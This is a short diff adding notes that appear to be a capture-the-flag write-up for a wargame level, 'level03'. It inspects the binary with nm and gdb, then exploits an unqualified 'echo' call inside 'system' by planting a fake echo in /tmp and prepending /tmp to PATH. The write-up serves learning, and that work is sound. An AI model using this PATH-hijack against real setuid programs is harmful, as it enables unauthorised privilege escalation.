@@ -1,0 +1,17 @@
+* when you execute level03 you can see "Exploit me"
+* see extern functions
+- nm -U ./level03 
+
+* there is "system" function
+
+* you can see args of system call with gdb
+- gdb ./level03
+	- b main
+	- r
+	- disassemble
+	- x/s 0x80483b0
+
+* "system" function call echo with right of file
+* exploit :
+- echo "getflag" > /tmp/echo
+- env PATH=/tmp:$PATH ./level03
